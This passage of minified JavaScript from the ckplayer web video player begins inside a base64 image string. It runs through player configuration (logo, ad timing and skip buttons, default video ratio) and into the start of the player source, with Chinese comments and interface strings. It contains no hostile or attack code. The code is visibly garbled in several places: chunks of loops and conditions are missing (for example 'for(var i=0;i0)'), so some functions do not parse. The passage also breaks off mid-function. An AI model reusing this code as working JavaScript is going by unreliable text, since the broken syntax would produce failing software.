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', align: 'center', vAlign: 'middle', offsetX: -100, offsetY: -40 }, logo: { //显示在右上角的logo图片，如果不需要可以删除该属性 file: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFcAAAAUCAYAAAD4BKGuAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAVTSURBVHja1Fl/aJVVGP4cw/mH5tUWi3I53cA0WbeIzMgaq6lQoVawm0S6glHhIKM/TELICotqCxMSGWQRdFfRLEhc9mMxqA0rbdS2wsV0GkZXuaKUWlHvgeeNh7f3u1du3Ft74eGcnXu+c873vD/Pt0nZbDZyZL2gWZAQTBH8IjggeEjgPZASPIB+g/P7EsGT6J/BfHfjHFIv2Jpjj/+dlDskvCm42Jk7X3C7YJOgw/z2oOBGwdEYRW0RVAjOCZ4ugNggqwU3CTLRBJFyQ+xuwVRY14igB78tE9QKpgmeEHwkGKRnq9AeMesHRWwEsYGUxwSdBZ51ecweE4Lct0DsOVjaZvptA8jfC4JfghWpXIJ2jMY+EDShf1pwh6DvX5x1GtpDE43cNFlfhyFWpQ9xd5FgFo3fRi++C+2nCBNBRgU3O6RsEyyEQv4QLMb4CcE9RlFBLqS1WZ6BZ83A35ofVhuvfE5QJrjWebdgCJOx51qM1QgewbMzsO57MDQrB9DeC8ObHd5Xyb2eiNiQQxmtgkZBr+OuZwV7BIcF1RgbF1wTE2MbEccX48VY9sMzBilhTke/m+b1Q9lefpgruI7OsYhIGzPJuAnn3+6EM7vu1YKl5vkrYRSfCGZivCxoMklk7M5j6eFlXyRNRSAvAoFf0Fo/CC7LkbwuQjsZsf0qwbuI9wlYgIqGl6NEzDYibJ/gbmAfxpKoMDRcaSK8xZzjZbK+NMhSYoNSngV5e+ksKXp+JdqZwDDmdpSbsqa9gNAyi5JalSGv3iQ+dtNK9HvI+sNBh2AhvNYVaH+msRtAdsa4ehoKCuQsoP2PY8+kCSkJ5IRWjD2FZ4/BOFSWYv9KhI40eUKQ31CqdnLM1c1OOnHufKSS+iEZvgHNhji8g1yT5VZKdCnHO+ajvrYK/I7GkuSWjwvq8Mzl5M79NF89aCHaBNXmWv0sQVUUZEDwsDnbr2i9s31lKyGuFs7kITEBC+snJaToRYIFrRN0CeYgoSUxJ23WUm85eB41b4IUuIvGtyIMVMY8lzHGMoYworF7J/onKYk10/wVQL6zXYr+Zq9aOEhuXZPDel8Q3If+HMzTeHPKlForEK+mws3SMfH2UMxNLIJbasKsoIQZwVLbKFkN4T1C3HxUMM+EkCAfgjwNV40Y304KriOP+jIHqa+jvYsqnH/kqzKaGCFZxWnoTqooxky8+dHUsOGwr6Jfi9jmlVVTHGLnot9L3qGWqCToWYYRF5fDa96mtb93yI2g8B0IWxlTHWmi/hOG00D4mEJfJ5WhQX7ySCsDUaNkJeud6+sgXCgs3OLEG2/xdZSh10JBeiB1zQU0HuQdSib60rOdm9kFToIL8hmFiRHzm1YM0ylet5k579OFpcUk4I0oD0/QuJ7tcBy5ERY6ixdrh5uNwN3bUV7pd4E+J958HmPxbRRydqK/in6vxj5aH9din/udEPKtuU1GqBL24xJwBInQWiHLcbQVKBXTzkVpHP0tWHsIpZUqPeWcrScXuX2ImRkqlufBhdQl15ig3WLKH0/SeAmtD+uprBqGx1ThhlWN5LKG4lcNKbDblFDjVDU0wWK7yLLqnPNk6cKzKsfXt1GQmQQXSuwymhd3tr9lkvPJMUV152kc2PsmUEMxtzdPRk2SNX2DQ3Vhr02Is18LXjHVAz/bG0NEK8johus3UBiwyfkYlDkQUyLaWrwZBrbHMaB8Z3PJLaYk8IIVKKPSJdxbv3ecynNzLNr33GKLV1YVW4IyfycXfq0UxP4X5HJdXCqX4Wv0AKqYkkipw4LG6WxMNi+GhAtH+M/K8wVe7wuWvwQYAFT+UsGCXmX3AAAAAElFTkSuQmCC', align: 'right', vAlign: 'top', offsetX: -100, offsetY: 10 }, advertisement: { //广告相关的配置 time: 5,//广告默认播放时长以及多个广告时每个广告默认播放时间，单位：秒 method: 'get',//广告监测地址默认请求方式，get/post videoForce: false,//视频广告是否强制播放结束 videoVolume: 0.8,//视频音量 skipButtonShow: true,//是否显示跳过广告按钮 linkButtonShow: true,//是否显示广告链接按钮，如果选择显示，只有在提供了广告链接地址时才会显示 muteButtonShow: true,//是否在视频广告时显示静音按钮 closeButtonShow: true,//暂停时是否显示关闭广告按钮 closeOtherButtonShow: true,//其它广告是否需要关闭广告按钮 frontSkipButtonDelay: 1,//前置广告跳过广告按钮延时显示的时间，单位：秒 insertSkipButtonDelay: 0,//插入广告跳过广告按钮延时显示的时间，单位：秒 endSkipButtonDelay: 0,//后置广告跳过广告按钮延时显示的时间，单位：秒 frontStretched: 2,//前置广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 insertStretched: 2,//插入广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 pauseStretched: 2,//暂停广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 endStretched: 2 //结束广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 }, video: { //视频的默认比例，当视频元数据里没有宽和高属性时默认使用该宽高 defaultWidth: 16,//宽度 defaultHeight: 9 //高度 } } }; } !(function(){var javascriptPath='';!function(){var scriptList=document.scripts,thisPath=scriptList[scriptList.length-1].src;javascriptPath=thisPath.substring(0,thisPath.lastIndexOf('/')+1)}();var ckplayer=function(obj){this.config={videoDbClick:true,errorTime:100,videoDrawImage:false,adSkipClick:'javaScript->adjump'};this.varsConfig={playerID:'',container:'',variable:'ckplayer',volume:0.8,poster:'',autoplay:false,loop:false,live:false,duration:0,forceduration:0,seek:0,drag:'',front:'',next:'',loaded:'',flashplayer:false,html5m3u8:false,track:null,cktrack:null,cktrackdelay:0,preview:null,prompt:null,video:null,config:'',type:'',crossorigin:'',crossdomain:'',unescape:false,mobileCkControls:false,mobileAutoFull:true,playbackrate:1,h5container:'',debug:false,overspread:true,adfront:'',adfronttime:'',adfrontlink:'',adpause:'',adpausetime:'',adpauselink:'',adinsert:'',adinserttime:'',adinsertlink:'',inserttime:'',adend:'',adendtime:'',adendlink:'',advertisements:''};this.vars={};this.language={volume:'音量：',play:'点击播放',pause:'点击暂停',full:'点击全屏',escFull:'退出全屏',mute:'点击静音',escMute:'取消静音',front:'上一集',next:'下一集',definition:'点击选择清晰度',playbackRate:'点击选择速度',subtitles:'点击选择字幕',error:'加载出错',adTime:'广告{$second}秒',skipAd:'跳过广告',skipAdTime:'{$second}秒后可跳过广告',adLink:'查看详情',noLoadShockwaveFlash:'您的浏览器不支持FlashPlayer插件或没有启用该插件',downLoadShockwaveFlash:'点击下载FlashPlayer插件'};this.contextMenu=[['ckplayer','link','http://www.ckplayer.com','_blank'],['version:X1','default','line']];this.errorList=[['000','Object does not exist'],['001','Variables type is not a object'],['002','Video object does not exist'],['003','Video object format error'],['004','Video object format error'],['005','Video object format error'],['006','[error] does not exist '],['007','Ajax error'],['008','Ajax error'],['009','Ajax object format error'],['010','Ajax.status:[error]']];this.playbackRateArr=[[0.5,'0.5倍'],[1,'正常'],[1.25,'1.25倍'],[1.5,'1.5倍'],[2,'2倍速'],[4,'4倍速']];this.playbackRateTemp=1;this.playbackRateDefault=1;this.subtitlesTemp=-1;this.logo='';this.loaded=false;this.timerError=null;this.error=false;this.errorUrl=[];this.timerFull=null;this.full=false;this.timerTime=null;this.timerBuffer=null;this.isTimeButtonMove=true;this.isTimeButtonDown=false;this.isClick=false;this.timerClick=null;this.timerLoading=null;this.timerCBar=null;this.needSeek=0;this.volume=0;this.volumeTemp=0;this.time=0;this.isFirst=true;this.html5Video=true;this.pdCoor={x:0,y:0};this.playerType='';this.loadTime=0;this.body=document.body||document.documentElement;this.V=null;this.listenerJsArr=[];this.buttonLen=0;this.buttonArr=[];this.buttonWidth={};this.elementArr=[];this.elementTempArr=[];this.track=[];this.trackIndex=0;this.nowTrackShow={sn:''};this.trackElement=[];this.timerVCanvas=null;this.animateArray=[];this.animateElementArray=[];this.animatePauseArray=[];this.previewStart=0;this.previewDiv=null;this.previewTop=null;this.previewWidth=120;this.previewTween=null;this.isM3u8=false;this.promptArr=[];this.promptElement=null;this.ckplayerConfig={};this.showFace=true;this.errorAdd=false;this.errorSend=false;this.controlBarIsShow=true;this.videoScale=1;this.fontFamily='\"Microsoft YaHei\"; YaHei; \"\\5FAE\\8F6F\\96C5\\9ED1\"; SimHei; \"\\9ED1\\4F53\";Arial';this.trackFontSize=16;this.trackLineHeight=30;this.timeSliderLeftTemp=0;this.durationSendJS=false;this.adAnalysisEnd=false;this.advertisements={};this.isFirstTimePlay=true;this.adType='';this.adI=0;this.videoTemp={src:'',source:'',currentSrc:'',loop:false};this.adTimeAllTotal=0;this.adTimeTotal=0;this.adCountDownObj=null;this.adPlayStart=false;this.adPlayerPlay=false;this.adIsPause=false;this.adVideoMute=false;this.adIsVideoTime=false;this.endAdPlay=false;this.adPauseShow=false;this.adReset=false;this.videoClickXy={x:0,y:0};this.adVideoPlay=false;if(obj){this.embed(obj)}this.loadTimeTemp=0;this.hlsAutoPlay=true};ckplayer.prototype={embed:function(c){if(window.location.href.substr(0,7)=='file://'){alert('Please use the HTTP protocol to open the page');return}if(c==undefined||!c){this.eject(this.errorList[0]);return}if(typeof(c)!='object'){this.eject(this.errorList[1])}this.vars=this.standardization(this.varsConfig,c);if(!this.vars['mobileCkControls']&&this.isMobile()){this.vars['flashplayer']=false;this.showFace=false}var videoString=this.vars['video'];if(!videoString){this.eject(this.errorList[2]);return}if(typeof(videoString)=='string'){if(videoString.substr(0,3)=='CK:'||videoString.substr(0,3)=='CE:'||videoString.substr(8,3)=='CK:'||videoString.substr(8,3)=='CE:'){this.vars['flashplayer']=true}}if(typeof(videoString)=='object'){if(videoString.length>1){if(videoString[0][0].substr(0,3)=='CK:'||videoString[0][0].substr(0,3)=='CE:'||videoString[0][0].substr(8,3)=='CK:'||videoString[0][0].substr(8,3)=='CE:'){this.vars['flashplayer']=true}}}if(this.vars['config']){this.ckplayerConfig=eval(this.vars['config']+'()')}else{this.ckplayerConfig=ckplayerConfig()}if((!this.supportVideo()&&this.vars['flashplayer']!='')||(this.vars['flashplayer']&&this.uploadFlash())||!this.isMsie()){this.html5Video=false;this.getVideo()}else if(videoString){this.analysedVideoUrl(videoString);return this}else{this.eject(this.errorList[2])}},analysedVideoUrl:function(video){var i=0,y=0;var thisTemp=this;this.VA=[];if(this.typeString(video)=='string'){if(video.substr(0,8)!='website:'){this.VA=[[video,'','',0]];var fileExt=this.getFileExt(video);switch(fileExt){case'.mp4':this.VA[0][1]='video/mp4';break;case'.ogg':this.VA[0][1]='video/ogg';break;case'.webm':this.VA[0][1]='video/webm';break;default:break}this.getVideo()}else{if(this.html5Video){var ajaxObj={url:video.substr(8),success:function(data){if(data){thisTemp.analysedUrl(data)}else{thisTemp.eject(thisTemp.errorList[5]);this.VA=video;thisTemp.getVideo()}}};this.ajax(ajaxObj)}else{this.VA=video;this.getVideo()}}}else if(this.typeString(video)=='array'){if(!this.isUndefined(typeof(video[0].length))){this.VA=video}this.getVideo()}else if(this.typeString(video)=='object'){if(!this.isUndefined(video['type'])){this.VA.push([video['file'],video['type'],'',0]);this.getVideo()}else{this.eject(this.errorList[5])}}else{this.eject(this.errorList[4])}},analysedUrl:function(data){this.vars=this.standardization(this.vars,data);if(!this.isUndefined(data['video'])){this.vars['video']=data['video']}this.analysedVideoUrl(this.vars['video'])},getHtml5Video:function(){var va=this.VA;var nva=[];var mobile=false;var video=document.createElement('video');var codecs=function(type){var cod='';switch(type){case'video/mp4':cod='avc1.4D401E, mp4a.40.2';break;case'video/ogg':cod='theora, vorbis';break;case'video/webm':cod='vp8.0, vorbis';break;default:break}return cod};var supportType=function(vidType,codType){if(!video.canPlayType){this.html5Video=false;return}var isSupp=video.canPlayType(vidType+';codecs=\"'+codType+'\"');if(isSupp==''){return false}return true};if(this.vars['flashplayer']||!this.isMsie()){this.html5Video=false;return}if(this.isMobile()){mobile=true}for(var i=0;i0){this.VA=nva}else{if(!mobile){this.html5Video=false}}},getVideo:function(){var thisTemp=this;var v=this.vars;if(!this.adAnalysisEnd&&(v['adfront']!=''||v['adpause']!=''||v['adinsert']!=''||v['adend']!=''||v['advertisements']!='')){this.adAnalysisEnd=true;this.adAnalysis();return}if(this.V){this.changeVideo();return}if(this.vars['cktrack']){this.loadTrack()}if(this.supportVideo()&&!this.vars['flashplayer']){this.getHtml5Video()}var src='',source='',poster='',loop='',autoplay='',track='';var video=v['video'];var i=0;this.CD=this.getByElement(v['container']);volume=v['volume'];if(!this.CD){this.eject(this.errorList[6],v['container']);return false}this.V=undefined;var thisPd=null;if(v['h5container']!=''){thisPd=this.getByElement(v['h5container']);if(this.isUndefined(thisPd)){thisPd=null}}var isVideoH5=null;if(v['playerID']!=''){isVideoH5=this.getByElement('#'+v['playerID']);if(this.isUndefined(isVideoH5)){isVideoH5=null}}if(thisPd!=null&&isVideoH5!=null){this.PD=thisPd}else{var playerID='ckplayer'+this.randomString();var playerDiv=document.createElement('div');playerDiv.className=playerID;this.CD.innerHTML='';this.CD.appendChild(playerDiv);this.PD=this.getByElement(playerID)}this.css(this.CD,{backgroundColor:'#000000',overflow:'hidden',position:'relative'});this.css(this.PD,{backgroundColor:'#000000',width:'100%',height:'100%',fontFamily:this.fontFamily});if(this.html5Video){this.PD.onselectstart=this.PD.ondrag=function(){return false};if(this.VA.length==1){this.videoTemp['src']=decodeURIComponent(this.VA[0][0]);src=' src=\"'+this.videoTemp['src']+'\"'}else{var videoArr=this.VA.slice(0);videoArr=this.arrSort(videoArr);for(i=0;i'}this.videoTemp['source']=source}if(v['autoplay']){autoplay=' autoplay=\"autoplay\"'}if(v['poster']){poster=' poster=\"'+v['poster']+'\"'}if(v['loop']){loop=' loop=\"loop\"'}if(v['seek']>0){this.needSeek=v['seek']}if(v['track']!=null&&v['cktrack']==null){var trackArr=v['track'];var trackDefault='';var defaultHave=false;for(i=0;ifullScreen')};this.addListenerInside('click',fullClick,this.CB['full']);var escFullClick=function(event){thisTemp.quitFullScreen();thisTemp.sendJS('clickEvent','actionScript->quitFullScreen')};this.addListenerInside('click',escFullClick,this.CB['escFull']);var adSkipClick=function(event){if(thisTemp.CB['adSkip'].innerHTML==thisTemp.language['skipAd']){thisTemp.runFunction(thisTemp.config['adSkipClick'])}};this.addListenerInside('click',adSkipClick,this.CB['adSkip']);var adMuteClick=function(event){thisTemp.adMuteFunction()};this.addListenerInside('click',adMuteClick,this.CB['adMute']);var adEscMuteClick=function(event){thisTemp.adEscMuteFunction()};this.addListenerInside('click',adEscMuteClick,this.CB['adEscMute']);var adPauseCloseClick=function(event){thisTemp.adPauseCloseFunction()};this.addListenerInside('click',adPauseCloseClick,this.CB['adPauseClose']);var promptHide=function(event){thisTemp.promptShow(false)};var playOver=function(event){thisTemp.promptShow(thisTemp.CB['play'])};this.addListenerInside('mouseover',playOver,this.CB['play']);this.addListenerInside('mouseout',promptHide,this.CB['play']);var pauseOver=function(event){thisTemp.promptShow(thisTemp.CB['pause'])};this.addListenerInside('mouseover',pauseOver,this.CB['pause']);this.addListenerInside('mouseout',promptHide,this.CB['pause']);var frontOver=function(event){thisTemp.promptShow(thisTemp.CB['front'])};this.addListenerInside('mouseover',frontOver,this.CB['front']);this.addListenerInside('mouseout',promptHide,this.CB['front']);var nextOver=function(event){thisTemp.promptShow(thisTemp.CB['next'])};this.addListenerInside('mouseover',nextOver,this.CB['next']);this.addListenerInside('mouseout',promptHide,this.CB['next']);var muteOver=function(event){thisTemp.promptShow(thisTemp.CB['mute'])};this.addListenerInside('mouseover',muteOver,this.CB['mute']);this.addListenerInside('mouseout',promptHide,this.CB['mute']);var escMuteOver=function(event){thisTemp.promptShow(thisTemp.CB['escMute'])};this.addListenerInside('mouseover',escMuteOver,this.CB['escMute']);this.addListenerInside('mouseout',promptHide,this.CB['escMute']);var fullOver=function(event){thisTemp.promptShow(thisTemp.CB['full'])};this.addListenerInside('mouseover',fullOver,this.CB['full']);this.addListenerInside('mouseout',promptHide,this.CB['full']);var escFullOver=function(event){thisTemp.promptShow(thisTemp.CB['escFull'])};this.addListenerInside('mouseover',escFullOver,this.CB['escFull']);this.addListenerInside('mouseout',promptHide,this.CB['escFull']);var definitionOver=function(event){thisTemp.promptShow(thisTemp.CB['definition'])};this.addListenerInside('mouseover',definitionOver,this.CB['definition']);this.addListenerInside('mouseout',promptHide,this.CB['definition']);var playbackrateOver=function(event){thisTemp.promptShow(thisTemp.CB['playbackrate'])};this.addListenerInside('mouseover',playbackrateOver,this.CB['playbackrate']);this.addListenerInside('mouseout',promptHide,this.CB['playbackrate']);var subtitlesOver=function(event){thisTemp.promptShow(thisTemp.CB['subtitles'])};this.addListenerInside('mouseover',subtitlesOver,this.CB['subtitles']);this.addListenerInside('mouseout',promptHide,this.CB['subtitles']);var volumePrompt=function(vol){var volumeBOXY=thisTemp.getCoor(thisTemp.CB['volumeBO']);var promptObj={title:thisTemp.language['volume']+vol+'%',x:volumeBOXY['x']+thisTemp.CB['volumeBO'].offsetWidth*0.5,y:volumeBOXY['y']};thisTemp.promptShow(false,promptObj)};var volumeObj={slider:this.CB['volumeBO'],follow:this.CB['volumeUp'],refer:this.CB['volumeBg'],grossValue:'volume',pd:true,startFun:function(vol){},monitorFun:function(vol){thisTemp.changeVolume(vol*0.01,false,false);volumePrompt(vol)},endFun:function(vol){},overFun:function(vol){volumePrompt(vol)}};this.slider(volumeObj);var volumeClickObj={refer:this.CB['volumeBg'],grossValue:'volume',fun:function(vol){thisTemp.changeVolume(vol*0.01,true,true)}};this.progressClick(volumeClickObj);this.timeButtonMouseDown();var volumeBgMove=function(event){var volumeBgXY=thisTemp.getCoor(thisTemp.CB['volumeBg']);var eventX=thisTemp.client(event)['x'];var eventVolume=parseInt((eventX-volumeBgXY['x'])*100/thisTemp.CB['volumeBg'].offsetWidth);var buttonPromptObj={title:thisTemp.language['volume']+eventVolume+'%',x:eventX,y:volumeBgXY['y']};thisTemp.promptShow(false,buttonPromptObj)};this.addListenerInside('mousemove',volumeBgMove,this.CB['volumeBg']);this.addListenerInside('mouseout',promptHide,this.CB['volumeBg']);this.addListenerInside('mouseout',promptHide,this.CB['volumeBO']);this.addDefListener();this.addPlaybackrate();this.addSubtitles()},videoClick:function(){var thisTemp=this;var clearTimerClick=function(){if(thisTemp.timerClick!=null){if(thisTemp.timerClick.runing){thisTemp.timerClick.stop()}thisTemp.timerClick=null}};var timerClickFun=function(){clearTimerClick();thisTemp.isClick=false;thisTemp.sendJS('videoClick',thisTemp.videoClickXy);if(thisTemp.adPlayerPlay){var ad=thisTemp.getNowAdvertisements();try{if(ad['link']!=''){window.open(ad['link'])}thisTemp.ajaxSuccessNull(ad['clickMonitor'])}catch(event){}}else{if(thisTemp.ckplayerConfig['config']['click']){thisTemp.playOrPause()}}};clearTimerClick();if(this.isClick){this.isClick=false;thisTemp.sendJS('videoDoubleClick',thisTemp.videoClickXy);if(thisTemp.ckplayerConfig['config']['doubleClick']){if(!this.full){thisTemp.fullScreen()}else{thisTemp.quitFullScreen()}}}else{this.isClick=true;this.timerClick=new this.timer(300,timerClickFun,1)}},timeButtonMouseDown:function(){var thisTemp=this;var timePrompt=function(time){if(isNaN(time)){time=0}var timeButtonXY=thisTemp.getCoor(thisTemp.CB['timeButton']);var promptObj={title:thisTemp.formatTime(time),x:timeButtonXY['x']-thisTemp.pdCoor['x']+thisTemp.CB['timeButton'].offsetWidth*0.5,y:timeButtonXY['y']-thisTemp.pdCoor['y']};thisTemp.promptShow(false,promptObj)};var timeObj={slider:this.CB['timeButton'],follow:this.CB['timeProgress'],refer:this.CB['timeBoBg'],grossValue:'time',pd:false,startFun:function(time){thisTemp.isTimeButtonMove=false},monitorFun:function(time){},endFun:function(time){if(thisTemp.V){if(thisTemp.V.duration>0){thisTemp.needSeek=0;thisTemp.videoSeek(parseInt(time))}}},overFun:function(time){timePrompt(time)}};var timeClickObj={refer:this.CB['timeBoBg'],grossValue:'time',fun:function(time){if(thisTemp.V){if(thisTemp.V.duration>0){thisTemp.needSeek=0;thisTemp.videoSeek(parseInt(time))}}}};var timeBoBgmousemove=function(event){var timeBoBgXY=thisTemp.getCoor(thisTemp.CB['timeBoBg']);var eventX=thisTemp.client(event)['x'];var duration=thisTemp.V.duration;if(isNaN(duration)||parseInt(duration)0){duration=thisTemp.vars['forceduration']}var eventTime=parseInt((eventX-timeBoBgXY['x'])*duration/thisTemp.CB['timeBoBg'].offsetWidth);var buttonPromptObj={title:thisTemp.formatTime(eventTime),x:eventX,y:timeBoBgXY['y']};thisTemp.promptShow(false,buttonPromptObj);var def=false;if(!thisTemp.isUndefined(thisTemp.CB['definitionP'])){if(thisTemp.css(thisTemp.CB['definitionP'],'display')!='block'){def=true}}if(thisTemp.vars['preview']!=null&&def){buttonPromptObj['time']=eventTime;thisTemp.preview(buttonPromptObj)}};var promptHide=function(event){thisTemp.promptShow(false);if(thisTemp.previewDiv!=null){thisTemp.css([thisTemp.previewDiv,thisTemp.previewTop],'display','none')}};if(!this.vars['live']){this.isTimeButtonDown=true;this.addListenerInside('mousemove',timeBoBgmousemove,this.CB['timeBoBg']);this.addListenerInside('mouseout',promptHide,this.CB['timeBoBg'])}else{this.isTimeButtonDown=false;timeObj['removeListenerInside']=true;timeClickObj['removeListenerInside']=true}this.slider(timeObj);this.progressClick(timeClickObj)},progressClick:function(obj){var thisTemp=this;var referMouseClick=function(event){var referX=thisTemp.client(event)['x']-thisTemp.getCoor(obj['refer'])['x'];var rWidth=obj['refer'].offsetWidth;var grossValue=0;if(obj['grossValue']=='volume'){grossValue=100}else{if(thisTemp.V){grossValue=thisTemp.V.duration;if(isNaN(grossValue)||parseInt(grossValue)0){grossValue=thisTemp.vars['forceduration']}}}var nowZ=parseInt(referX*grossValue/rWidth);if(obj['fun']){if(obj['grossValue']==='time'){var sliderXY=thisTemp.getCoor(thisTemp.CB['timeButton']);sliderLeft=sliderXY['x'];if(!thisTemp.checkSlideLeft(referX,sliderLeft,rWidth)){return}var bimeButtonWB=thisTemp.CB['timeButton'].offsetWidth*0.5;thisTemp.css(thisTemp.CB['timeButton'],'left',(referX-bimeButtonWB)+'px');thisTemp.css(thisTemp.CB['timeProgress'],'width',(referX)+'px')}obj['fun'](nowZ)}};if(this.isUndefined(obj['removeListenerInside'])){this.addListenerInside('click',referMouseClick,obj['refer'])}else{this.removeListenerInside('click',referMouseClick,obj['refer'])}},slider:function(obj){var thisTemp=this;var clientX=0,criterionWidth=0,sliderLeft=0,referLeft=0;var value=0;var calculation=function(){var sLeft=parseInt(thisTemp.css(obj['slider'],'left'));var rWidth=obj['refer'].offsetWidth-obj['slider'].offsetWidth;var grossValue=0;if(thisTemp.isUndefined(sLeft)||isNaN(sLeft)){sLeft=0}if(obj['grossValue']=='volume'){grossValue=100}else{if(thisTemp.V){grossValue=thisTemp.V.duration}}return parseInt(sLeft*grossValue/rWidth)};var mDown=function(event){thisTemp.addListenerInside('mousemove',mMove,document);thisTemp.addListenerInside('mouseup',mUp,document);var referXY=thisTemp.getCoor(obj['refer']);var sliderXY=thisTemp.getCoor(obj['slider']);clientX=thisTemp.client(event)['x'];referLeft=referXY['x'];sliderLeft=sliderXY['x'];criterionWidth=clientX-sliderLeft;if(obj['startFun']){obj['startFun'](calculation())}};var mMove=function(event){clientX=thisTemp.client(event)['x'];var 